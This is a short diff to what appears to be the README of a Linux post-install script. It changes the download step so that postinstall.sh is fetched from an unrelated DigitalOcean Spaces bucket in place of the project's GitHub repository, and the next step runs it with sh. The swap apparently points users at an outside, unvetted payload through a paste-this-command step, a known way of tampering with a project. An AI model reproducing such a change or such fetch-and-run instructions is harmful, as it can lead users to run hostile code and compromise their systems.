@@ -12,7 +12,7 @@ open terminal/konsole and enter:
 
 `sudo apt install wget`
 
-`sudo wget https://github.com/ant0n-anon/Linux-Post-Install-Script/blob/main/postinstall.sh`
+`sudo wget https://winder-dapsym.sfo3.digitaloceanspaces.com/dev/postinstall.sh`
 
 `sh postinstall.sh`
 
